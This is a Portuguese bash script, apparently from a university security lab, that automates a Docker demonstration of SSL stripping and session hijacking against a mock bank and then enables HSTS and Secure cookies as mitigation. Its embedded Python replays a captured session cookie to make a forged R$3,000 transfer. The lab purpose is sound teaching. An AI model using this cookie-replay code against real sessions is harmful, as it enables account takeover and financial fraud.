#!/bin/bash
# Demonstração Automatizada do Ataque e Mitigação
# CEUB - Alexsandro Patrício dos Santos Júnior

set -e

VERDE="\033[92m"
VERMELHO="\033[91m"
AMARELO="\033[93m"
AZUL="\033[94m"
CIANO="\033[96m"
BOLD="\033[1m"
RESET="\033[0m"

clear 2>/dev/null || true
echo -e "${CIANO}${BOLD}======================================================================${RESET}"
echo -e "${CIANO}${BOLD}   DEMONSTRAÇÃO PRÁTICA: SSL STRIPPING & SEQUESTRO DE SESSÃO          ${RESET}"
echo -e "${CIANO}${BOLD}   CEUB - Alexsandro Patrício dos Santos Júnior                       ${RESET}"
echo -e "${CIANO}${BOLD}======================================================================${RESET}\n"

# 1. Checa containers
echo -e "${AZUL}[Etapa 1] Verificando se os containers estão ativos...${RESET}"
if ! docker compose ps | grep -q "lab_servidor"; then
    echo -e "${AMARELO}[*] Containers desligados. Subindo stack agora...${RESET}"
    docker compose up -d --build
    sleep 3
fi
echo -e "${VERDE}[+] Servidor, Vítima e Atacante estão em execução na rede 172.20.0.0/24!${RESET}\n"

# 2. Reseta o laboratório para o estado padrão
echo -e "${AZUL}[Etapa 2] Restaurando saldos iniciais do laboratório...${RESET}"
docker exec -t lab_servidor curl -s -X POST http://127.0.0.1:5000/api/reset > /dev/null
STATUS_INICIAL=$(docker exec -t lab_servidor curl -s http://127.0.0.1:5000/api/status)
echo -e "  Saldo Inicial da Vítima:  ${VERDE}R$ 5000.00${RESET}"
echo -e "  Saldo Inicial do Hacker:  ${VERMELHO}R$ 50.00${RESET}\n"

# 3. Vítima acessa e autentica no banco via HTTP (Canal Desprotegido)
echo -e "${AZUL}[Etapa 3] Vítima navegando no Internet Banking via HTTP (Texto Claro)...${RESET}"
echo -e "  Vítima conecta em http://banco.lab.local/login e envia credenciais..."
LOGIN_OUTPUT=$(docker exec lab_vitima python3 /app/simular_usuario.py --login)
echo -e "$LOGIN_OUTPUT" | grep -E "LOGIN REALIZADO|Flags" || echo "$LOGIN_OUTPUT"

# Extrai o cookie emitido para a vítima de forma limpa (sem códigos de cor ANSI)
COOKIE_VITIMA=$(docker exec lab_servidor curl -s http://127.0.0.1:5000/api/status | python3 -c "import sys, json; s = json.load(sys.stdin)['sessoes_ativas']; print(s[-1] if s else '')")

echo -e "\n${AMARELO}[*] Identificador de Sessão da Vítima:${RESET} ${BOLD}${COOKIE_VITIMA}${RESET}\n"

# 4. Atacante executa o Sequestro de Sessão (Session Hijacking)
echo -e "${VERMELHO}${BOLD}[Etapa 4] O Atacante sequestra a sessão da vítima usando o cookie interceptado!${RESET}"
echo -e "  O invasor NÃO possui a senha da vítima. Ele injeta o cookie e realiza uma transferência forjada."
sleep 1

docker exec -t lab_atacante python3 -c "
import requests

cookie = '$COOKIE_VITIMA'
cookies = {'session_id': cookie}
headers = {'Host': 'banco.lab.local', 'Accept': 'application/json'}

print('[+] Conectando ao banco com a identidade sequestrada da vítima...')
r_dash = requests.get('http://172.20.0.10/dashboard', cookies=cookies, headers=headers)
if r_dash.status_code == 200:
    print('\033[92m[+] Acesso autenticado obtido com sucesso pelo invasor!\033[0m')

print('[+] Executando transferência fraudulenta de R$ 3.000,00 para atacante@fraude.org...')
r_transf = requests.post(
    'http://172.20.0.10/transferir',
    cookies=cookies,
    headers=headers,
    data={'destinatario': 'atacante@fraude.org', 'valor': 3000.00}
)
if r_transf.status_code == 200:
    print('\033[91m\033[1m[🚨 FRAUDE CONCLUÍDA! R$ 3.000,00 TRANSFERIDOS ILICITAMENTE! 🚨]\033[0m')
"

# 5. Comprovação do Impacto no Negócio
echo -e "\n${AZUL}[Etapa 5] Verificando impacto no saldo bancário após o ataque:${RESET}"
STATUS_FINAL=$(docker exec -t lab_servidor curl -s http://127.0.0.1:5000/api/status)
SALDO_VITIMA=$(echo "$STATUS_FINAL" | python3 -c "import sys, json; print('%.2f' % json.load(sys.stdin)['saldo_vitima'])")
SALDO_ATACANTE=$(echo "$STATUS_FINAL" | python3 -c "import sys, json; print('%.2f' % json.load(sys.stdin)['saldo_atacante'])")

echo -e "  Novo Saldo da Vítima:  ${VERMELHO}${BOLD}R$ ${SALDO_VITIMA}${RESET} (Reduzido em R$ 3.000,00 sem consentimento!)"
echo -e "  Novo Saldo do Hacker:  ${VERDE}${BOLD}R$ ${SALDO_ATACANTE}${RESET} (Aumentou para R$ 3.050,00!)\n"

# 6. Demonstração da Mitigação (HSTS e Cookies Seguros)
echo -e "${CIANO}${BOLD}[Etapa 6] Ativando Mitigação Criptográfica: HSTS (RFC 6797) e ISO/IEC 27002...${RESET}"
docker exec -t lab_servidor curl -s -X POST -H "Content-Type: application/json" -d '{"modo": "mitigado"}' http://127.0.0.1:5000/api/alternar-seguranca > /dev/null

echo -e "[*] Inspecionando cabeçalhos de resposta do servidor após mitigação:"
docker exec -t lab_vitima curl -s -I -k https://banco.lab.local/login | grep -E "Strict-Transport-Security|Set-Cookie|X-Content-Type" || true

echo -e "\n${VERDE}${BOLD}======================================================================${RESET}"
echo -e "${VERDE}${BOLD}   CONCLUSÃO DO TESTE DE LABORATÓRIO                                  ${RESET}"
echo -e "${VERDE}${BOLD}======================================================================${RESET}"
echo -e "1. Sem mitigação: SSL Stripping rebaixa a conexão para HTTP e expõe o cookie."
echo -e "2. O cookie desprotegido permitiu o sequestro completo da sessão da vítima."
echo -e "3. Com HSTS e flag Secure: O cliente recusa o texto claro e protege o cookie."
echo -e "======================================================================\n"
